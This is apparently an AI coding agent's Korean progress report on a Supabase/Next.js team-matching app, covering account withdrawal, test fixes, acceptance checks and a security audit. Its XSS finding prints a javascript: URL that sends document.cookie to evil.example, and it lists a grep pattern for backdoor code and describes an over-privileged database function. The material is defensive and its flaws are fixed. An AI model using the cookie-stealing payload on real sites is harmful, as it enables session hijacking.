- **화면:** `/me/withdraw` — 팀장 차단 상태면 안내+링크만, 아니면 영향 범위 안내 + 체크박스 동의 + 확인 다이얼로그 + 탈퇴 버튼. 성공 시 `supabase.auth.signOut()` 후 `/login?withdrawn=1`로 리다이렉트, 로그인 화면에 탈퇴 완료 안내 표시.
- **검증:** 통합 테스트(`tests/rls/account_withdrawal.test.ts`, 4건) — 팀장+다른 멤버 있으면 거부, 탈퇴 시 프로필 비식별화·파티 멤버십 정리(`left`)·채팅 시스템 메시지에 "탈퇴한 사용자" 반영·대기 지원 취소·매칭 대기열 취소·탈퇴 후 쓰기 거부(`ACCOUNT_WITHDRAWN`)까지 한 흐름으로 확인, 중복 탈퇴 거부, 정지된 계정도 탈퇴 가능. `npm test` **125/125 통과**(새 테스트 과정에서 `seed.sql`의 영구 데모 확정 파티 멤버십이 실제 탈퇴 호출로 'left'가 되어 `cross_user.test.ts`를 깨뜨리는 교차 오염을 발견해 테스트 cleanup에서 복원하도록 고쳤다), `lint`/`typecheck`/`build`/전체 Playwright(7/7) 모두 성공. `/me/withdraw`를 360px/1440px로 스크린샷 확인.

## 5-A단계 전체 요약

차단·신고·관리자(계정 정지/활동 제보 승인/감사 로그)·회원 탈퇴를 모두 구현했다. 핵심 설계 선택:
- `blocks`/`reports`/`audit_logs` 테이블과 `profiles.account_status`는 **2단계(기반)에서 이미 만들어져 있었다** — 이번 작업은 주로 그 위에 DB 함수와 화면을 올리는 것이었다.
- 계정 정지/탈퇴 강제는 기존 10여 개 SECURITY DEFINER 함수를 고치지 않고 테이블 레벨 트리거(`_enforce_active_account`)로 공통화해, 현재·향후 모든 쓰기 경로를 한 번에 보호한다.
- 신고된 메시지 열람은 "그 메시지 전후 몇 개만, 운영자만, 조회 자체도 감사 로그"로 제한해 "일반적인 전체 채팅 열람 도구"가 되지 않게 했다.

## 5-B단계: 테스트 안정화 (진행 중)

5-A를 "끝"이라고 보고하기 전에 남겨뒀던 할 일 — `tests/rls/matching.test.ts`에서 pg_cron과의 경합을 이유로 지웠던 `expect(result.new_proposals).toBe(1)` 단언을 복구했다. 복구하며 실제로 반복 실행(5회 × 여러 차례)해 보니, 원인으로 짐작했던 pg_cron보다 **두 가지 실제 버그**가 더 크게 기여하고 있었다 — 둘 다 그동안 "가끔 실패하는 테스트"로만 보였지 원인을 추적한 적이 없었다.

1. **`match_proposal_members.queue_id` FK에 `ON DELETE CASCADE`가 빠져 있었다(마이그레이션 `20261004040000`로 수정).** `activities` 삭제는 `matching_queue`·`match_proposals` 양쪽으로 CASCADE되고 `match_proposals → match_proposal_members`도 CASCADE지만, `match_proposal_members.queue_id → matching_queue`는 기본값(NO ACTION)이었다. 같은 삭제 문 안에서 두 CASCADE 경로의 처리 순서에 따라 `matching_queue`가 아직 참조되고 있다는 FK 위반으로 **활동 삭제 전체가 조용히 실패**할 수 있었다(제안이 1건이라도 걸린 활동이면 거의 항상 재현됨 — `psql`로 직접 재현 확인). 여러 테스트 파일의 `deleteActivity()` 헬퍼가 삭제 결과 에러를 확인하지 않아 이 실패를 계속 삼켰고, "정원에 못 든 대기자"의 `matching_queue` 행이 활동과 함께 지워지지 않은 채 `waiting`으로 남아 **다음 워커 실행 때마다 다시 매칭 대상에 포함**됐다 — `matching.test.ts`의 전역 `new_proposals` 카운트가 흔들린 진짜 원인이었다. **실제 영향 범위는 테스트를 넘어선다** — 운영자가 빠른 매칭 제안이 있었던 활동을 삭제하려 하면 프로덕션에서도 같은 오류로 실패했을 것이다.
2. **`tests/rls/invariants.test.ts`가 `ORDER BY` 없는 `LIMIT 1`로 "아무 활동·아무 프로필"을 골라 썼다.** ORDER BY 없는 LIMIT은 반환 행을 보장하지 않는데, 실제로 그렇게 고른 "첫 활동"이 `seed.sql`이 student1을 활성 멤버로 미리 넣어 둔 바로 그 데모 활동과 자주 일치했다 — 이 테스트가 student1을 같은 활동에 또 활성 멤버로 넣으려다 `party_members_one_active_per_activity` 유니크 위반으로 자기 자신과 충돌했다. 다른 파일들과 같은 패턴(테스트 전용 활동을 `beforeEach`로 매번 새로 생성)으로 바꿔 공유 시드 데이터와의 우연한 충돌을 없앴다.
3. **pg_cron 경합 자체도 이론상 가능해** `tests/global-setup.ts`를 추가했다 — 테스트 스위트 시작 전 `cron.unschedule`로 `match-worker` 작업을 내리고, 스위트가 끝나면 마이그레이션과 동일한 정의로 복원한다(로컬 Postgres 포트에 `pg`로 직접 연결 — 테스트 전용 제어 함수를 프로덕션 스키마에 남기지 않기 위해 순수 테스트 하네스 안에서 처리). 위 1·2번을 고치기 전에는 이것만으로 흔들림이 사라지지 않았지만(진짜 원인이 아니었으므로), 세 가지를 모두 적용한 뒤에는 흔들리지 않는다.
- **검증:** 위 세 가지를 모두 적용한 뒤 `npm test`를 **연속 10회**(`tests/rls`만 5회 + 전체 스위트 5회) 실행해 전부 125/125(또는 66/66) 통과 확인. `lint`/`typecheck`/`build` 모두 성공.

## 5-B단계: 인수 조건 점검 (지시서 13장, 17개 시나리오)

지시서 13장의 표를 실제 테스트 파일·테스트 이름에 연결한다. "약함"으로 표시했던 4개
항목(권한 위조, 채팅 접근 공격, 운영자 CSV, 환경 분리)은 이번에 테스트를 추가해 보강했다.

| # | 시나리오 | 기대 결과 | 검증 방법 | 상태 |
|---|---|---|---|---|
| 1 | 온보딩·수정 | 새로고침 후 유지되고 추천 근거가 변경됨 | E2E `auth-onboarding.spec.ts`(새로고침 후 유지 확인) + 단위 `recommend.test.ts`(입력이 바뀌면 점수·근거가 다시 계산됨, 10건) | ⚠️ **부분**: "프로필 수정 → 실제 화면에 다른 추천 근거가 표시됨"을 잇는 전용 E2E는 없다. `loadRecommendationForActivity`가 캐시 없이 매 렌더링마다 현재 `profile_interests`를 다시 읽어 순수 함수에 넣는 구조라 배선 위험은 낮다고 판단했지만, 실제 화면으로 눈으로 확인한 적은 없다 — 시간 제약으로 추가하지 못함(재현 명령: student1로 로그인 → `/me/edit`에서 관심분야를 "환경"으로 바꿈 → `관심분야 태그가 '환경'인 활동` 상세에서 "관심분야 '환경' 일치" 배지 확인) |
| 2 | 활동 검색·필터 | 필터 조합·페이지 이동·URL 복원이 작동함 | E2E `activities-filter.spec.ts` | ✅ |
| 3 | 마감 활동 | 기본 추천에서 제외되고 원문 상세는 확인 가능 | 쿼리 레벨(`recommendations/query.ts`·`page.tsx`가 `status='published'`만 조회) + RLS `anon.test.ts`("draft/closed 활동은 비회원에게 보이지 않는다") | ⚠️ **부분**: 제외 자체는 한 줄 쿼리 필터로 구조적으로 보장되지만, "추천 목록에서 마감 활동이 실제로 빠진다"는 것을 직접 단언하는 테스트는 없다 |
| 4 | 추천 미상 정보 | 없는 자격·일정·전공 근거를 만들어내지 않음 | 단위 `recommend.test.ts`("비교 불가 항목은 제외하고 정규화", "미입력 일정을 맞는다고 표시하지 않음") | ✅ |
| 5 | 파티 마지막 자리 동시 승인 | 정원 초과 없이 한 명만 확정됨 | RLS `party_lifecycle.test.ts`("같은 역할의 마지막 슬롯에 동시 승인 2건이 들어와도 1명만 성공한다") | ✅ |
| 6 | 동일 활동의 두 파티 동시 가입 | 하나만 확정되고 나머지는 정리됨 | RLS `party_lifecycle.test.ts`("같은 활동 두 파티의 동시 승인 시 한 곳만 성공하고 나머지 지원은 superseded 처리된다") | ✅ |
| 7 | 빠른 매칭 성공 | 역할·전체 공통 시간 충족, 전원 수락 후 팀/채팅방 한 번 생성 | RLS `matching.test.ts`("매칭 성공 → 전원 수락 → 파티와 채팅방이 정확히 1개만 생성된다") + `matching_consistency.test.ts`(TS/plpgsql 일치) + E2E `match-flow.spec.ts` | ✅ |
| 8 | 겹침의 함정 | 두 사람씩만 시간이 맞고 전체 교집합이 없으면 팀 미생성 | 단위 `matching.test.ts`(TS) + RLS `matching_consistency.test.ts` + `matching_scenarios.test.ts`(plpgsql 워커) — 3중 검증 | ✅ |
| 9 | 거절·기한 초과 | 제안 해제, 사전 동의한 사용자만 재대기 | RLS `matching.test.ts`("한 명이 거절하면 제안이 해제되고...", "수락 기한이 지나면 만료 처리되고...") | ✅ |
| 10 | 워커 중복 실행·재시도 | 중복 제안·팀·알림이 생기지 않음 | RLS `matching.test.ts`("워커를 동시에 두 번 실행해도 같은 그룹에 중복 제안이 생기지 않는다", "마지막 두 명이 동시에 수락해도 파티는 1개만 생긴다") + `chat.test.ts`("같은 client_message_id로 재전송해도 1건만 저장된다") | ✅ |
| 11 | 두 독립 세션 채팅 | 실시간 수신, 새로고침 복구, 실패 재시도 시 중복 없음 | E2E `chat-flow.spec.ts`(독립 브라우저 컨텍스트 2개) | ✅ |
| 12 | 채팅 접근 공격 | 다른 팀의 조회·전송·구독 요청이 서버/DB에서 거부됨 | RLS `chat.test.ts`(조회·전송, 직접 테이블 INSERT 우회 포함) + `cross_user.test.ts`(조회) + **신규** E2E `outsider-chat-access.spec.ts`(구독 — 페이지 접근 자체 차단) + E2E `chat-flow.spec.ts`(이미 열려 있던 연결이 탈퇴 후 구독 끊김) | ✅ (이번에 구독 경로 보강) |
| 13 | 탈퇴·강퇴 | 기존 열린 연결을 포함해 이후 채팅 접근이 차단됨 | RLS `chat.test.ts`("탈퇴 직후에는 조회·전송이 모두 거부된다") + E2E `chat-flow.spec.ts`(이미 열린 연결이 탈퇴 후 메시지 미수신) | ✅ |
| 14 | 차단 사용자 | 새로운 자동 매칭에서 제외됨 | 단위 `matching.test.ts`(TS, "차단된 사용자끼리는 같은 팀으로 묶지 않음") + RLS `matching_consistency.test.ts`·`matching_scenarios.test.ts`(plpgsql 워커) + `blocking.test.ts`(파티 지원 거부, 알림 억제) | ✅ |
| 15 | 권한 위조 | 일반 사용자가 관리자 역할·타인 프로필·활동을 수정할 수 없음 | RLS `admin_write.test.ts`(활동 등록 **및 수정** 거부 — **신규**, `user_roles` 자가 승격 거부) + `cross_user.test.ts`(타인 프로필 수정 거부) + E2E `admin-access.spec.ts`(관리자 화면 접근 거부) | ✅ (이번에 "활동 수정" 거부 테스트 보강) |
| 16 | 운영자 CSV | 잘못된 행·중복을 확인하고 안전하게 등록 가능 | 단위 `activities-csv.test.ts`(파싱·검증·중복 탐지 15건) + **신규** RLS `admin_write.test.ts`(운영자는 CSV와 같은 모양으로 일괄 등록 가능/비공개 생성, 일반 사용자는 거부) | ✅ (이번에 실제 DB 쓰기 양성/음성 테스트 보강) |
| 17 | 환경 분리 | 운영 환경에 데모 시드·개발 인증 우회·비밀 키 노출이 없음 | 수동 실행 + grep 확인(아래 "실제 실행한 검증과 결과" 표에 명령과 결과 기록) — 자동화된 단위/통합 테스트가 아니라 빌드 산출물·소스 검사다 | ✅ (이번에 실제로 실행해 확인) |

**요약:** 17개 중 15개 ✅, 2개(1·3번) ⚠️ 부분 — 둘 다 "기능은 구조적으로 보장되지만 그 사실을
직접 단언하는 전용 테스트가 없다"는 같은 종류의 격차이며, 시간 제약으로 이번에 추가하지
못했다. 완료로 보고하지 않고 재현 명령과 함께 남겨둔다.

### 17번(환경 분리) 실제 실행한 명령과 결과

| 명령 | 결과 |
|---|---|
| `grep -rniE "bypass\|skip.?auth\|dev.?only.?login\|NODE_ENV\s*===\s*.development.\|backdoor\|debug.?login\|fake.?(user\|auth\|login)" src/` | 일치 없음 — 개발용 인증 우회 코드 없음 |
| `grep -rln "seed.sql" src/ next.config.ts package.json` | 일치 없음 — `seed.sql`은 Supabase CLI(`db reset`/`db seed`)로만 적용되고 앱 런타임 코드 어디에서도 참조하지 않음 |
| `grep -rl "<로컬 SERVICE_ROLE_KEY 값>" .next/static` (`npm run build` 산출물) | 일치 없음 — 클라이언트 번들(`static/`)에 service-role 키가 없음 |
| `grep -rl "<로컬 SERVICE_ROLE_KEY 값>" .next` (전체) | `.next/cache/turbopack/*.sst`(빌드러 내부 캐시, 빌드 머신에만 존재하고 브라우저에 서빙되지 않음)에서만 발견 — 클라이언트에 도달하는 경로 없음 |
| `grep -rl "SERVICE_ROLE\|service_role" .next/static` | 일치 없음 |

## 5-B단계: 보안 리뷰

**독립 reviewer 에이전트에게 맡겼고, 지연은 있었지만 결국 성공했다.** `general-purpose`
서브에이전트를 보안 리뷰 전담으로 띄웠는데, 18분 동안 세 번 상태를 확인(SendMessage)해도
응답이 없어("idle" 상태만 표시, 실행 중인지 끝났는지 구분 불가) 그 사이 **직접 리뷰를
병행했다**(아래 "직접 발견한 것" — XSS 1건 포함). 그런데 그 직후, 에이전트가 **실제로는 리뷰를
끝내고 결과를 여러 번 보냈지만 전달이 지연되던 메시지들이 한꺼번에 도착**했다(Claude Code
플랫폼 쪽 지연/유실 문제로 보임 — 세션 피드백으로 보고해 뒀다). 그 보고서에서 **제가 놓쳤던
실제 Medium 취약점**(`is_admin_profile` EXECUTE 권한 누락)을 지적받았고, 이를 검증하는 과정에서
**더 심각한 동일 계열 문제**를 추가로 발견해 함께 고쳤다(아래 "독립 리뷰가 찾아내고, 조사하며
더 발견한 것"). 결과적으로 "구현에 참여하지 않은 시선"이 실제로 추가 가치를 냈다 — 제 직접
리뷰만으로는 찾지 못했던 결함이다.

### 점검 범위와 방법

- **RLS 정책 전체**(`supabase/migrations/*.sql` 전부): 모든 사용자 데이터 테이블에 RLS가
  켜져 있고 정책이 있는지, 소유자/운영자 범위가 맞는지 직접 읽으며 확인.
- **SECURITY DEFINER 함수 61개**: `search_path` 고정 여부를 스크립트로 전수 검사, EXECUTE
  권한 부여 패턴을 grep으로 확인.
- **서버 액션 입력 검증**: `zod` 사용 여부 확인, DB 함수 쪽 검증으로 실질적으로 충분한지 평가.
- **XSS**: `dangerouslySetInnerHTML` 사용 여부, 사용자 입력이 `href` 등 속성값으로 렌더링되는
  모든 지점 확인.
- **오픈 리다이렉트**: `src/lib/url.ts`/`src/app/auth/confirm/route.ts` 재확인(기존 단위
  테스트 13건이 이미 검증 중).
- **빈도 제한**: 로그인/OTP(Supabase 내장 `auth.rate_limit`), 파티/채팅/신고/제보(앱 레벨
  `app_settings`) 전체 확인.

### 직접 발견한 것 (독립 리뷰 응답을 기다리는 동안)

| 심각도 | 위치 | 문제 | 공격 시나리오 | 조치 |
|---|---|---|---|---|
| **높음** | `activities.source_url` → `src/app/activities/[id]/page.tsx`, `src/app/admin/submissions/SubmissionRow.tsx` | 사용자가 직접 입력한 `source_url`을 `<a href={...}>`로 그대로 렌더링. React는 텍스트는 이스케이프하지만 속성값(href)은 스킴을 검사하지 않는다 | 일반 사용자가 `/activities/submit`으로 `source_url = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"`인 활동을 제보 → **운영자가 `/admin/submissions`에서 검토하며 "원문 링크" 버튼을 클릭하는 순간**(승인 여부와 무관하게) 운영자 세션에서 스크립트 실행 → 운영자 쿠키·세션 탈취 가능. 승인되면 활동을 보는 모든 사용자에게도 같은 위험이 퍼짐 | **수정함** — ① `src/lib/url.ts`에 `isHttpUrl()` 추가, 두 렌더링 지점 모두 `isHttpUrl(url)`일 때만 링크로 렌더링(마이그레이션 없이 바로 적용). ② `submit_activity()` DB 함수도 저장 시점에 `http(s)://`가 아니면 `INVALID_SOURCE_URL`로 거부(마이그레이션 `20261004050000`, 여러 겹 방어). 단위 테스트 4건 + RLS 테스트 1건 추가, 전부 통과 |
| 정보 | `is_party_member(uuid)` | `anon`에게도 EXECUTE가 부여돼 있음 | 비로그인 사용자가 임의 `party_id`로 직접 호출 가능하지만, 내부적으로 `auth.uid()`(null)를 기준으로 판정하므로 항상 `false`를 반환 — 정보 유출 없음 | 조치 안 함(실제 위험 없음) — 다만 아래 "독립 리뷰가 찾아내고 조사하며 더 발견한 것"을 보면 이 함수의 grant 자체가 애초에 효과가 없던 설정이었다는 게 드러난다 |
| 정보 | 서버 액션 입력 검증에 `zod`가 전혀 쓰이지 않음 | 타입스크립트 타입은 런타임에 사라지므로 서버 액션 자체는 "느슨하게 타입된 입력"을 받는다 | 코드베이스 전체가 "쓰기는 반드시 SECURITY DEFINER 함수를 거치고 그 함수가 다시 검증한다" 패턴이라 실제 악용 사례는 못 찾음 | 조치 안 함(독립 리뷰도 같은 결론 — Low, 아래 참조) |

### 독립 리뷰가 찾아내고, 조사하며 더 발견한 것

독립 reviewer의 보고서(지연 전달됨, High 0건·Medium 1건·Low 3건)에서 제가 놓친 **Medium 1건**을
지적받았다: `is_admin_profile(uuid)`에 EXECUTE 권한 정리가 빠져 있어 **비로그인 사용자도
임의의 `profile_id`가 운영자인지 직접 조회할 수 있다**(로컬에서 anon 키로
`POST /rest/v1/rpc/is_admin_profile`을 호출해 실제로 재현 확인) — 닉네임 뒤에 신원을 숨긴다는
설계 원칙을 깨는 정보 유출이다.

이걸 고치려고 `pg_default_acl`을 직접 조회하다가 **더 근본적인 문제**를 발견했다: 이 저장소
전체가 61개 SECURITY DEFINER 함수마다 반복해 온 `revoke all on function ... from public`
패턴이 **애초에 한 번도 제대로 동작한 적이 없었다.** Supabase 로컬 스택은 `public` 스키마의
새 함수에 `anon`/`authenticated`/`service_role`에게 EXECUTE를 자동으로 부여하는 기본 권한
(`ALTER DEFAULT PRIVILEGES`)을 걸어 두는데, 이건 `PUBLIC`(모두)이 아니라 **그 역할 이름으로
직접** 부여되는 것이라 `revoke ... from public`으로는 전혀 건드려지지 않는다. 실제로
`information_schema.routine_privileges`로 확인해 보니 "운영자만" 호출 가능하다고 여겨 온
`create_report` 같은 함수도 `anon`이 여전히 EXECUTE를 쥐고 있었다.

**다행히 실질 피해는 제한적이다** — 거의 모든 함수가 본문 맨 앞에서 `auth.uid() is null`을
확인해 비로그인 호출을 즉시 거부하므로, "호출은 되지만 즉시 막힌다"는 점에서 결과적으로는
안전했다. 하지만 **`_finalize_match_proposal(proposal_id)`는 이 자기 확인이 없다** — "전원
수락했는지"는 호출 전에 `respond_to_match_proposal`이 이미 확인했다고 가정하고, 자신은 멱등
가드(`status<>'proposed' or party_id is not null`)만 본다. 즉 **로그인한 사용자 누구나
아직 전원이 수락하지 않은 `proposal_id`로 이 함수를 직접 호출하면, 일부만 수락한 매칭 제안도
강제로 확정시켜 파티·채팅방을 만들 수 있었다** — "전원 수락해야 확정 팀이 생긴다"(지시서 7장 B
항목 8)는 핵심 불변식을 정상 화면 없이 깰 수 있는, 실질적으로 **높음** 수준의 경로였다.
독립 리뷰의 코드 스캔 범위에는 이 특정 조합(권한 누락 + 호출 시점 미검증 함수)까지는 잡히지
않았지만, 그 리뷰가 지적한 패턴을 따라가다 보니 드러났다 — "독립적인 시선"이 실제로 작동한
사례로 기록해 둔다.

**수정(마이그레이션 `20261004060000`):** `is_admin_profile`과 내부 전용(`_` 접두사) 함수 10개
전부에서 `anon`과 `authenticated`로부터 명시적으로 EXECUTE를 revoke했다(이번엔 역할 이름을
직접 지정 — `public`이 아니라). 세 가지 모두(`is_admin_profile`, `_blocked`,
`_finalize_match_proposal`) 로컬에서 anon/authenticated 키로 직접 호출해 `42501 permission
denied`로 막히는 것을 재현 확인했고, 정상 경로(다른 SECURITY DEFINER 함수 내부에서 호출)는
그 함수의 소유자 권한으로 실행되므로 전혀 영향받지 않는다(`npm test` 137/137로 재확인).
회귀 테스트 4건 추가(`reports_and_moderation.test.ts`).

독립 리뷰가 추가로 지적한 나머지: **Low 2건**(OTP 빈도 제한은 Supabase 내장 설정에만 의존 —
직접 리뷰와 같은 결론, 조치 안 함; `matching_queue` 참가/승인/거절에 명시적 빈도 제한 없음 —
유니크 제약과 팀장/운영자 권한으로 이미 저위험이라 조치 안 함), **정보 2건**(`.env.example`을
읽지 못함 — 이 세션과 같은 권한 제약; 오픈 리다이렉트 보호는 안전하다고 재확인).

### 확인했고 문제 없었던 것 ("Checked, no issues found")

- SECURITY DEFINER 함수 61개 전수 스캔 — `search_path` 누락 0건.
- EXECUTE 권한: 수정 전에는 `_`로 시작하는 내부 헬퍼 10개 + `is_admin_profile`이 전부
  `anon`/`authenticated`에 노출돼 있었다(바로 위 "독립 리뷰가 찾아내고..." 참조) — **지금은
  전부 명시적으로 revoke되어 소유자 컨텍스트에서만 호출된다.**
- `execute format(...)` 동적 SQL 사용처를 모두 확인 — 사용자 입력을 직접 문자열 결합하는 곳
  없음(테이블/함수 이름처럼 코드 내부에서 고정된 식별자에만 `format('%I', ...)` 사용).
  SQL 인젝션 경로 없음.
- `dangerouslySetInnerHTML` 사용 0건.
- 오픈 리다이렉트: `src/lib/url.ts`가 Host 헤더를 신뢰하지 않고 허용 목록 기반으로만 origin을
  고르며, `next` 파라미터도 인코딩 우회까지 거부(기존 단위 테스트 13건으로 검증됨, 재확인 완료).
- CSRF: `next.config.ts`에 서버 액션의 기본 Origin 검사를 느슨하게 하는 설정(`serverActions.allowedOrigins`
  재정의 등) 없음 — Next.js 기본 보호 그대로 적용됨.
- 로그인/OTP 빈도 제한: Supabase 내장 `auth.rate_limit`(5분당 로그인 시도 30회, 검증 30회)으로
  보호됨. 파티 생성/지원, 채팅 메시지, 신고, 활동 제보는 모두 `app_settings`의 앱 레벨 빈도
  제한이 있음(각 마이그레이션에서 확인).
- 비밀값 노출: 위 "환경 분리" 절의 grep 결과 참조 — 클라이언트 번들에 service-role 키 없음.

## 5-B단계: 보안 마무리 (EXECUTE 권한 전수 점검)

바로 위 "5-B단계: 보안 리뷰"에서 `is_admin_profile`/내부 함수 10개를 고치며 발견한
"`revoke all on function ... from public`은 anon/authenticated 접근을 막지 못한다"는 문제를
**전체 `public` 스키마로 확대 점검**했다. `pg_proc`/`pg_default_acl`을 직접 조회해(이번에는
`db reset`으로 완전히 새로 만든 DB에서, 수동 개입 없이) 확인한 결과, 지금까지 "막혀 있다"고
문서에 적어 둔 함수 다수가 실제로는 그대로 열려 있었다.

### 발견한 것

- **가장 심각함(높음): `run_match_worker(timestamptz)`가 anon에게까지 열려 있었다.** 기준
  시각을 인자로 받는 이 워커 함수는 pg_cron(service_role)만 호출해야 하는데,
  `revoke all ... from public` + `grant ... to service_role`로는 Supabase가 생성 시점에
  이름을 명시해 건 anon/authenticated grant가 전혀 지워지지 않았다. 즉 **비로그인 사용자도
  임의의 기준 시각으로 매칭 워커 전체 실행을 직접 트리거할 수 있었다** — 분당 1회로 제한된
  pg_cron 스케줄을 무시하고 원하는 시각·빈도로 만료 처리/매칭 편성을 강제할 수 있는 경로였다.
- **중간: `create_notification`/`insert_system_chat_message`/`lock_activity_membership`과
  트리거 헬퍼 7개**(`set_updated_at`, `handle_new_user`, `party_members_before_insert`,
  `party_members_sync_slot_count`, `parties_sync_confirmed_members`,
  `parties_create_chat_room`, `chat_messages_broadcast`)도 같은 leak으로 열려 있었다. 실질
  피해는 없다고 판단했다(전부 다른 SECURITY DEFINER 함수 안에서만 호출되거나 — 그 시점엔
  함수 소유자 postgres 권한으로 실행되므로 외부 grant가 무의미함 — 트리거로만 실행되는
  함수라 `trigger` 반환형은 PostgREST가 RPC로 노출하지 않고 직접 SQL 호출도 애초에 거부됨).
  그래도 최소 권한 원칙에 따라 명시적으로 제거했다.
- **낮음(정보 노출 아님, 최소 권한 위반): "허용 목록"에 있는 로그인 사용자용 RPC 26개**
  (`create_party`/`apply_to_party`/`send_chat_message`/`join_matching_queue`/`submit_activity`
  등)와 `is_match_proposal_member(uuid)`가 전부 anon에게도 EXECUTE가 열려 있었다. 전부 본문
  맨 앞에서 `auth.uid() is null`을 확인해 비로그인 호출을 거부하므로 정보가 새지는 않았지만,
  "호출은 되지만 즉시 막힌다"가 아니라 "호출 자체가 안 된다"로 방어 겹을 하나 늘리기 위해
  anon에서 제거하고 authenticated에게만 남겼다.

### 수정 (마이그레이션 `20261004070000`)

1. 위에서 발견한 모든 함수에서 `anon`/`authenticated` EXECUTE를 **역할 이름을 직접 지정해서**
   revoke했다(`run_match_worker` 등 11개는 완전히 제거, "허용 목록" 27개는 anon만 제거하고
   authenticated는 유지).
2. **재발 방지:** `alter default privileges for role postgres in schema public revoke execute
   on functions from anon, authenticated;`로 Supabase가 걸어 둔 기본값 자체를 뒤집었다 — 이제
   `postgres` 역할로 만드는 새 함수는 아무것도 하지 않아도 anon/authenticated에게 자동으로
   열리지 않는다(`service_role`에 대한 기본 부여는 그대로 둠 — 서버 전용 역할이라 안전하고
   워커 함수들이 이 기본값에 의존함). `postgres`는 `supabase_admin`의 기본값을 바꿀 권한이
   없다는 것도 실제로 시도해 확인했다(42501) — Supabase 플랫폼 부트스트랩 스키마용이라
   우리 마이그레이션과는 무관하므로 그대로 둔다.
3. `is_admin()`/`is_party_member(uuid)`는 **의도적으로 예외**로 남겨 anon/authenticated 둘 다
   유지했다 — 이 둘은 anon도 조회 가능한 테이블(activities/profiles/party_members/chat_* 등)의
   RLS 정책 USING절 안에서 직접 호출되므로, anon의 EXECUTE가 없으면 그 테이블 조회 자체가
   "permission denied for function"으로 깨진다(`tests/rls/anon.test.ts`가 "비로그인 조회는
   에러 없이 빈 배열"을 기대함 — 실제로 없애고 돌려봐서 깨지는 것까지 확인한 뒤 되돌렸다).

### 가드 테스트 (`tests/rls/execute_privileges.test.ts`, 6건)

PostgREST/supabase-js의 `.from()`으로는 `pg_catalog`/`information_schema`를 조회할 수
없으므로(노출된 스키마가 아님), `tests/global-setup.ts`와 같은 방식으로 로컬 Postgres
포트(54322)에 `pg`로 직접 연결해 `aclexplode(proacl)`로 모든 함수의 EXECUTE grant를 전수
조회한다. 허용 목록(anon+authenticated 2개, authenticated 전용 28개)과 정확히 일치하는지
확인하고(초과·누락 모두 실패), `run_match_worker`와 `_`로 시작하는 내부 함수는 별도로
"anon/authenticated 둘 다 전혀 없어야 한다"를 단언한다. `ALTER DEFAULT PRIVILEGES`가 실제로
걸려 있는지(`pg_default_acl` 조회)도 함께 검증해, 다음 마이그레이션이 이 설정을 실수로
되돌려도 바로 잡아낸다.

### 문서화

위 규칙(기본값이 닫혀 있다는 전제, 새 함수를 열 때의 패턴, anon을 거의 쓰지 않는 이유,
워커 함수는 service_role 전용)을 `docs/architecture.md` 13장과 `README.md`
"데이터베이스 함수 권한 규칙" 절에 적었다 — 다음에 함수를 추가하는 사람(또는 나 자신)이
같은 실수를 반복하지 않도록.

### 검증

| 명령 | 결과 |
|---|---|
| `npx supabase db reset` | 성공(마이그레이션 28개 전체 재적용 + 시드) — 이번엔 이 상태로 점검해 이전 세션의 수동 개입이 결과에 섞이지 않게 했다 |
| `npm run lint` | 성공, 0 problems |
| `npm run typecheck` | 성공 |
| `npm test` (Vitest) | **143/143 통과**(기존 137건 + 신규 가드 테스트 6건) |
| `npm run build` | 성공 (26개 라우트) |
| `npm run test:e2e` (Playwright, 프로덕션 빌드 대상) | **8/8 통과** |

## 2-B 산출물

- **인증:** `/login`(이메일 매직링크, 비밀번호 없음) → `/auth/confirm`(token_hash 교환, 서버 세션 쿠키) → 온보딩 완료 여부로 분기. 개발용 인증 우회 없음.
- **온보딩/프로필:** `/onboarding`(닉네임만 필수, 나머지 8단계는 건너뛰기 가능) / `/me/edit`(같은 폼, 단일 페이지). 지시서 4장 전 항목(소속·복수전공, 관심분야, 희망 활동, 역할, 참여조건, 가능한 시간, 선택정보, 공개설정) 반영.
- **활동 탐색/상세:** `/activities`(키워드·유형·모집상태·진행방식·팀참여·지역 필터 — 순수 GET 폼이라 URL에 자동 반영, 페이지네이션 10건) / `/activities/[id]`(자격·KST 일정·원문 링크·"원문 확인 필요"/데모 배지, 추천·파티 섹션은 3~4단계 자리만 확보).
- **관리자:** `/admin`(user_roles 기반 접근 제어, 비관리자는 403 컴포넌트) / `/admin/activities`(공개·비공개·마감 전환) / `/admin/activities/new`,`/[id]/edit` / `/admin/activities/import`(CSV 업로드 → 행별 오류·중복 미리보기 → 선택 확인 후 비공개로 일괄 등록).
- **공통 UI:** 하단 탭(홈/활동/파티/채팅/마이), 파티·채팅은 "준비 중" 빈 상태, 로딩/빈 상태/오류+재시도/권한없음 공통 컴포넌트(`src/components/states.tsx`), 차분한 블루 톤(학교 상징색과 별개로 직접 정의).
- **스키마 보완(2-A 이후 발견분):** `activity_types`+`profile_preferred_activity_types`(희망 활동), `activities`에 `summary/eligibility/participation_mode/team_min_size/team_max_size/benefit/last_verified_at` 추가, `profiles`에 `academic_status/preferred_location_type/preferred_region/weekly_available_hours/experience/matching_opt_in/notifications_enabled` 추가 + 닉네임 유니크 인덱스. 마이그레이션 `20261003130100`, `20261003130200`.
- **party_members 상호 조회 재귀 버그 수정(요청 사항):** `public.is_party_member(party_id)` SECURITY DEFINER 헬퍼 추가(마이그레이션 `20261003130000`) — 함수가 테이블 소유자 권한으로 내부 조회를 수행해 RLS를 다시 평가하지 않으므로 재귀가 끊긴다. `party_members`/`chat_rooms`/`chat_messages`/`chat_read_states` 정책을 이 헬퍼로 재작성. `tests/rls/cross_user.test.ts`에 "같은 파티원은 서로 조회 가능, 다른 파티원은 불가" 케이스 추가, 통과.

## 실제 실행한 검증과 결과

| 명령 | 결과 |
|---|---|
| `npx supabase db reset` | 성공, 오류 없음 (마이그레이션 21개 전체 적용 + 시드, 4-B 마이그레이션 `20261003170000`~`20261003170400` 포함) |
| `npm run lint` | 성공, 0 problems |
| `npm run typecheck` (`next typegen && tsc --noEmit`) | 성공 |
| `npm test` (Vitest: 단위 52건 + RLS/통합 39건) | **91/91 통과** (매칭 알고리즘 10건 `tests/unit/matching.test.ts`, 매칭 워커 통합 6건 `tests/rls/matching.test.ts` 포함) |
| `npm run build` | 성공 (`/match/[activityId]` 라우트 포함 21개 라우트 생성) |
| `npx playwright test` (E2E, 프로덕션 빌드 대상, 6건) | **6/6 통과** — 빠른 매칭 전체 흐름(대기열 참가→워커 실행→제안→전원 수락→채팅, `match-flow.spec.ts`) 포함 |
| 360px/1440px 스크린샷 확인 (홈/활동탐색/활동상세/로그인) | 가로 스크롤 없음, 필터·카드·폼이 레이아웃 깨짐 없이 축소·중앙정렬됨 |
